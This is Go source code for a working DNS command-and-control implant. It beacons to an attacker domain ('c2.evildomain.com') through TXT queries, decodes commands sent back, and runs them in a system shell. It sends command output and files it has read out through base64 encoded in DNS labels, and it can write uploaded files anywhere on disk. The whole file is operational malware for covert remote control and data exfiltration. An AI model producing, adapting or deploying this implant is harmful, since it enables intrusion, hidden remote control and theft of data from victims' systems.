package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/miekg/dns"
)

// ─── Constants ───────────────────────────────────────────────────────────────

const (
	version         = "1.0.0"
	userAgentPrefix = "dns-c2-implant"
)

// ─── Implant Config ─────────────────────────────────────────────────────────

type Config struct {
	Server      string // IP of C2 DNS server
	Domain      string // C2 domain (e.g. c2.evildomain.com)
	ImplantID   string // Unique implant ID
	Interval    int    // Query interval in seconds
	DirectMode  bool   // Send UDP directly to C2 server instead of system resolver
	UseResolver bool   // Use system DNS resolver
}

// ─── State ───────────────────────────────────────────────────────────────────

type ImplantState struct {
	mu            sync.Mutex
	interval      int
	pendingCmd    string   // current command to execute
	cmdChunks     []string // partial command chunks
	cmdTotal      int
	outputBuffer  []string // queued output chunks ready to send
	pendingUpload *FileUploadState
}

type FileUploadState struct {
	RemotePath string
	FileSize   int
	Buffer     []byte
	TotalChunks int
	ReceivedChunks int
	Complete    bool
}

// ─── Platform Commands ───────────────────────────────────────────────────────

func getShell() []string {
	if runtime.GOOS == "windows" {
		return []string{"cmd.exe", "/C"}
	}
	return []string{"/bin/sh", "-c"}
}

// ─── Base64 Encoding/Decoding ────────────────────────────────────────────────

func b64encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func b64decode(s string) ([]byte, error) {
	// Try standard
	data, err := base64.StdEncoding.DecodeString(s)
	if err == nil {
		return data, nil
	}
	// Try URL-safe
	data, err = base64.URLEncoding.DecodeString(s)
	if err == nil {
		return data, nil
	}
	// Try padded
	pad := 4 - len(s)%4
	if pad < 4 {
		s += strings.Repeat("=", pad)
	}
	data, err = base64.StdEncoding.DecodeString(s)
	if err == nil {
		return data, nil
	}
	return nil, err
}

// ─── DNS Query ───────────────────────────────────────────────────────────────

func buildDNSQuery(id string, domain string, status string, outputB64 string, seq int, total int) string {
	// Format: <status>.<id>.<data>.c2.<domain>
	// status: "ready", "output", "chunk", "error"
	// data: base64-encoded output, or empty if no output

	if seq > 0 && total > 0 {
		// Chunked output
		return fmt.Sprintf("%s.%s.%d.%d.%s.c2.%s",
			status, id, seq, total, outputB64, domain)
	}
	if outputB64 != "" {
		return fmt.Sprintf("%s.%s.%s.c2.%s",
			status, id, outputB64, domain)
	}
	return fmt.Sprintf("%s.%s.c2.%s",
		status, id, domain)
}

func sendDNSQueryViaResolver(queryDomain string) (string, error) {
	// Use system resolver
	c := dns.Client{}
	m := new(dns.Msg)
	m.SetQuestion(queryDomain+".", dns.TypeTXT)
	m.SetEdns0(4096, true) // EDNS0 for larger responses

	r, _, err := c.Exchange(m, net.JoinHostPort("8.8.8.8", "53"))
	if err != nil {
		return "", fmt.Errorf("dns exchange failed: %w", err)
	}

	for _, ans := range r.Answer {
		if txt, ok := ans.(*dns.TXT); ok && len(txt.Txt) > 0 {
			return txt.Txt[0], nil
		}
	}
	return "", nil
}

func sendDNSQueryDirect(server string, queryDomain string) (string, error) {
	c := dns.Client{
		UDPSize: 4096,
	}
	m := new(dns.Msg)
	m.SetQuestion(queryDomain+".", dns.TypeTXT)
	m.SetEdns0(4096, true)

	// Check if server already has a port; default to 53
	serverAddr := server
	if _, _, err := net.SplitHostPort(server); err != nil {
		serverAddr = net.JoinHostPort(server, "5353")
	}

	r, _, err := c.Exchange(m, serverAddr)
	if err != nil {
		return "", fmt.Errorf("dns exchange failed: %w", err)
	}

	for _, ans := range r.Answer {
		if txt, ok := ans.(*dns.TXT); ok && len(txt.Txt) > 0 {
			return txt.Txt[0], nil
		}
	}
	return "", nil
}

func sendDNSQuery(server, domain, queryDomain string, directMode bool) (string, error) {
	if directMode {
		return sendDNSQueryDirect(server, queryDomain)
	}
	return sendDNSQueryViaResolver(queryDomain)
}

// ─── Command Execution ───────────────────────────────────────────────────────

func executeCommand(cmdStr string) (string, error) {
	// Special commands
	if strings.HasPrefix(cmdStr, "__INTERVAL__:") {
		parts := strings.SplitN(cmdStr, ":", 2)
		if len(parts) == 2 {
			interval, err := strconv.Atoi(parts[1])
			if err == nil && interval > 0 {
				return fmt.Sprintf("INTERVAL_SET:%d", interval), nil
			}
		}
		return "INTERVAL_ERROR", nil
	}

	if strings.HasPrefix(cmdStr, "__UPLOAD_START__:") {
		return handleUploadStart(cmdStr)
	}

	if strings.HasPrefix(cmdStr, "__UPLOAD_CHUNK__:") {
		return handleUploadChunk(cmdStr)
	}

	if strings.HasPrefix(cmdStr, "__UPLOAD_END__:") {
		return handleUploadEnd(cmdStr)
	}

	if strings.HasPrefix(cmdStr, "__DOWNLOAD__:") {
		return handleDownload(cmdStr)
	}

	if strings.HasPrefix(cmdStr, "__PING__") {
		return "PONG", nil
	}

	if strings.HasPrefix(cmdStr, "__SLEEP__:") {
		parts := strings.SplitN(cmdStr, ":", 2)
		if len(parts) == 2 {
			dur, err := time.ParseDuration(parts[1])
			if err == nil {
				time.Sleep(dur)
				return "SLEPT:" + parts[1], nil
			}
		}
		return "SLEEP_ERROR", nil
	}

	// Execute actual shell command
	shell := getShell()
	cmd := exec.Command(shell[0], append(shell[1:], cmdStr)...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("ERROR: %s\n%s", err.Error(), string(output)), nil
	}
	return string(output), nil
}

// ─── File Upload Handling ───────────────────────────────────────────────────

var globalState ImplantState

func handleUploadStart(cmdStr string) (string, error) {
	// Format: __UPLOAD_START__:<remote_path>:<file_size>
	parts := strings.SplitN(cmdStr, ":", 3)
	if len(parts) < 3 {
		return "UPLOAD_START_ERROR:malformed", nil
	}

	remotePath := parts[1]
	fileSize, err := strconv.Atoi(parts[2])
	if err != nil {
		return fmt.Sprintf("UPLOAD_START_ERROR:invalid_size:%s", parts[2]), nil
	}

	globalState.mu.Lock()
	globalState.pendingUpload = &FileUploadState{
		RemotePath: remotePath,
		FileSize:   fileSize,
		Buffer:     make([]byte, 0, fileSize),
	}
	globalState.mu.Unlock()

	return fmt.Sprintf("UPLOAD_START_OK:%s:%d", remotePath, fileSize), nil
}

func handleUploadChunk(cmdStr string) (string, error) {
	// Format: __UPLOAD_CHUNK__:<seq>:<total>:<base64_chunk>
	parts := strings.SplitN(cmdStr, ":", 4)
	if len(parts) < 4 {
		return "UPLOAD_CHUNK_ERROR:malformed", nil
	}

	seq, err := strconv.Atoi(parts[1])
	if err != nil {
		return fmt.Sprintf("UPLOAD_CHUNK_ERROR:invalid_seq:%s", parts[1]), nil
	}

	total, err := strconv.Atoi(parts[2])
	if err != nil {
		return fmt.Sprintf("UPLOAD_CHUNK_ERROR:invalid_total:%s", parts[2]), nil
	}

	chunkData, err := b64decode(parts[3])
	if err != nil {
		return fmt.Sprintf("UPLOAD_CHUNK_ERROR:decode_failed:%s", err), nil
	}

	globalState.mu.Lock()
	if globalState.pendingUpload == nil {
		globalState.mu.Unlock()
		return "UPLOAD_CHUNK_ERROR:no_active_upload", nil
	}
	globalState.pendingUpload.Buffer = append(globalState.pendingUpload.Buffer, chunkData...)
	globalState.pendingUpload.ReceivedChunks++
	globalState.pendingUpload.TotalChunks = total
	globalState.mu.Unlock()

	return fmt.Sprintf("UPLOAD_CHUNK_OK:%d/%d", seq, total), nil
}

func handleUploadEnd(cmdStr string) (string, error) {
	// Format: __UPLOAD_END__:<remote_path>
	parts := strings.SplitN(cmdStr, ":", 2)
	if len(parts) < 2 {
		return "UPLOAD_END_ERROR:malformed", nil
	}
	remotePath := parts[1]

	globalState.mu.Lock()
	if globalState.pendingUpload == nil {
		globalState.mu.Unlock()
		return "UPLOAD_END_ERROR:no_active_upload", nil
	}

	if globalState.pendingUpload.RemotePath != remotePath {
		globalState.mu.Unlock()
		return "UPLOAD_END_ERROR:path_mismatch", nil
	}

	buffer := globalState.pendingUpload.Buffer
	expectedSize := globalState.pendingUpload.FileSize
	globalState.mu.Unlock()

	if len(buffer) != expectedSize {
		return fmt.Sprintf("UPLOAD_END_ERROR:size_mismatch:got_%d_expected_%d", len(buffer), expectedSize), nil
	}

	// Write the file
	if err := os.WriteFile(remotePath, buffer, 0644); err != nil {
		return fmt.Sprintf("UPLOAD_END_ERROR:write_failed:%s", err), nil
	}

	globalState.mu.Lock()
	globalState.pendingUpload = nil
	globalState.mu.Unlock()

	return fmt.Sprintf("UPLOAD_COMPLETE:%s:%d", remotePath, expectedSize), nil
}

// ─── File Download Handling ─────────────────────────────────────────────────

func handleDownload(cmdStr string) (string, error) {
	// Format: __DOWNLOAD__:<remote_path>
	parts := strings.SplitN(cmdStr, ":", 2)
	if len(parts) < 2 {
		return "DOWNLOAD_ERROR:malformed", nil
	}

	remotePath := parts[1]
	data, err := os.ReadFile(remotePath)
	if err != nil {
		return fmt.Sprintf("DOWNLOAD_ERROR:%s", err), nil
	}

	encoded := b64encode(data)
	return fmt.Sprintf("DOWNLOAD_DATA:%s:%d:%s", remotePath, len(data), encoded), nil
}

// ─── Output Chunking ─────────────────────────────────────────────────────────

const outputChunkSize = 400 // max base64 chars per DNS label

func chunkOutput(output string) []string {
	encoded := b64encode([]byte(output))
	if len(encoded) <= outputChunkSize {
		return []string{encoded}
	}

	var chunks []string
	for i := 0; i < len(encoded); i += outputChunkSize {
		end := i + outputChunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		chunks = append(chunks, encoded[i:end])
	}
	return chunks
}

// ─── Command Parsing (chunked commands from server) ──────────────────────────

func processServerResponse(txt string, state *ImplantState) (bool, string) {
	txt = strings.TrimSpace(txt)

	if txt == "" {
		return false, ""
	}

	// Parse: "<base64command>.<seq>.<total>" or just "<base64command>"
	parts := strings.SplitN(txt, ".", 3)

	if len(parts) >= 3 {
		// Could be: base64.seq.total
		seq, err1 := strconv.Atoi(parts[1])
		total, err2 := strconv.Atoi(parts[2])
		if err1 == nil && err2 == nil && seq > 0 && total > 0 {
			state.mu.Lock()
			if state.cmdChunks == nil || seq == 1 {
				state.cmdChunks = make([]string, total)
				state.cmdTotal = total
			}
			if seq <= total {
				state.cmdChunks[seq-1] = parts[0]
			}
			complete := true
			for _, c := range state.cmdChunks {
				if c == "" {
					complete = false
					break
				}
			}
			state.mu.Unlock()

			if complete {
				fullCmd := strings.Join(state.cmdChunks, "")
				decoded, err := b64decode(fullCmd)
				state.mu.Lock()
				state.cmdChunks = nil
				state.cmdTotal = 0
				state.mu.Unlock()
				if err != nil {
					return true, fmt.Sprintf("DECODE_ERROR: %s", err)
				}
				return true, string(decoded)
			}
			return false, "" // Waiting for more chunks
		}
	}

	// Single chunk command
	decoded, err := b64decode(parts[0])
	if err != nil {
		return false, ""
	}
	return true, string(decoded)
}

// ─── Config Persistence ──────────────────────────────────────────────────────

func loadConfig(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}
	return &cfg, nil
}

func saveConfig(path string, cfg *Config) error {
	data, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, data, 0600)
}

func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// ─── Main Loop ───────────────────────────────────────────────────────────────

func main() {
	// Flag definitions
	var (
		server      string
		domain      string
		implantID   string
		interval    int
		directMode  bool
		useResolver bool
		configPath  string
		oneShot     bool
	)

	flag.StringVar(&server, "server", "", "C2 DNS server IP (for direct mode)")
	flag.StringVar(&domain, "domain", "c2.evildomain.com", "C2 domain")
	flag.StringVar(&implantID, "id", "", "Implant ID (auto-generated if empty)")
	flag.IntVar(&interval, "interval", 30, "Query interval in seconds")
	flag.BoolVar(&directMode, "direct", false, "Send UDP directly to C2 server")
	flag.BoolVar(&useResolver, "resolver", false, "Use system DNS resolver")
	flag.StringVar(&configPath, "config", "", "Path to config file")
	flag.BoolVar(&oneShot, "oneshot", false, "Run one query and exit")

	flag.Parse()

	// Load config from file if specified
	if configPath != "" {
		cfg, err := loadConfig(configPath)
		if err == nil {
			if server == "" {
				server = cfg.Server
			}
			if domain == "" {
				domain = cfg.Domain
			}
			if implantID == "" {
				implantID = cfg.ImplantID
			}
			if cfg.Interval > 0 {
				interval = cfg.Interval
			}
			directMode = cfg.DirectMode
			useResolver = cfg.UseResolver
		}
	}

	// Environment overrides
	if v := os.Getenv("C2_SERVER"); v != "" {
		server = v
	}
	if v := os.Getenv("C2_DOMAIN"); v != "" {
		domain = v
	}
	if v := os.Getenv("C2_IMPLANT_ID"); v != "" {
		implantID = v
	}
	if v := os.Getenv("C2_INTERVAL"); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			interval = n
		}
	}
	if os.Getenv("C2_DIRECT") == "1" || os.Getenv("C2_DIRECT") == "true" {
		directMode = true
	}

	// Generate ID if not set
	if implantID == "" {
		implantID = generateID()
	}

	// Validate
	if server == "" && directMode {
		fmt.Fprintf(os.Stderr, "Error: -server flag required in direct mode\n")
		os.Exit(1)
	}

	if interval < 1 {
		interval = 30
	}

	fmt.Fprintf(os.Stderr, "DNS C2 Implant v%s\n", version)
	fmt.Fprintf(os.Stderr, "  Implant ID: %s\n", implantID)
	fmt.Fprintf(os.Stderr, "  Domain:     %s\n", domain)
	fmt.Fprintf(os.Stderr, "  Interval:   %ds\n", interval)
	if directMode {
		// Show server address, preserving any port the user specified
		srvDisplay := server
		if _, _, err := net.SplitHostPort(server); err != nil {
			srvDisplay = net.JoinHostPort(server, "53")
		}
		fmt.Fprintf(os.Stderr, "  Server:     %s (direct UDP)\n", srvDisplay)
	} else {
		fmt.Fprintf(os.Stderr, "  Mode:       System DNS resolver\n")
	}

	// Save config if we loaded from file
	if configPath != "" {
		cfg := &Config{
			Server:      server,
			Domain:      domain,
			ImplantID:   implantID,
			Interval:    interval,
			DirectMode:  directMode,
			UseResolver: useResolver,
		}
		if err := saveConfig(configPath, cfg); err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not save config: %v\n", err)
		}
	}

	// Initial state
	state := &ImplantState{}
	globalState = ImplantState{}
	state.interval = interval

	outputBuf := ""

	// Signal handling
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	// Main beacon loop
	fmt.Fprintf(os.Stderr, "Starting beacon loop...\n")

	for {
		select {
		case <-sigCh:
			fmt.Fprintf(os.Stderr, "\nShutting down...\n")
			return
		default:
		}

		// Check if we have a new interval set
		state.mu.Lock()
		currentInterval := state.interval
		state.mu.Unlock()

		// Build the query
		// Format: <status>.<id>.<base64-output>.c2.<domain>
		status := "ready"
		outputB64 := ""

		if outputBuf != "" {
			status = "output"
			outputB64 = b64encode([]byte(outputBuf))
			outputBuf = ""
		}

		queryFQDN := buildDNSQuery(implantID, domain, status, outputB64, 0, 0)

		// Send DNS query and get response
		txtResponse, err := sendDNSQuery(server, domain, queryFQDN, directMode)
		if err != nil {
			fmt.Fprintf(os.Stderr, "DNS query error: %v\n", err)
		} else {
			fmt.Fprintf(os.Stderr, "DNS response received\n")

			// Check if response contains a command
			if txtResponse != "" {
				hasCmd, cmd := processServerResponse(txtResponse, state)
				if hasCmd {
					fmt.Fprintf(os.Stderr, "Executing command: %s\n", cmd)
					result, err := executeCommand(cmd)

					// Special handling for interval change
					if strings.HasPrefix(result, "INTERVAL_SET:") {
						parts := strings.SplitN(result, ":", 2)
						if len(parts) == 2 {
							newInterval, _ := strconv.Atoi(parts[1])
							state.mu.Lock()
							state.interval = newInterval
							state.mu.Unlock()
							currentInterval = newInterval
						}
					}

					if err != nil {
						outputBuf = fmt.Sprintf("EXEC_ERROR: %s", err)
					} else {
						outputBuf = result
					}
				}
			}
		}

		if oneShot {
			fmt.Fprintf(os.Stderr, "One-shot mode, exiting\n")
			return
		}

		// Sleep for the interval
		fmt.Fprintf(os.Stderr, "Sleeping %d seconds...\n", currentInterval)

		// Sleep in smaller increments so we can catch signals
		slept := 0
		for slept < currentInterval {
			time.Sleep(1 * time.Second)
			slept++
			select {
			case <-sigCh:
				fmt.Fprintf(os.Stderr, "\nShutting down...\n")
				return
			default:
			}
		}
	}
}
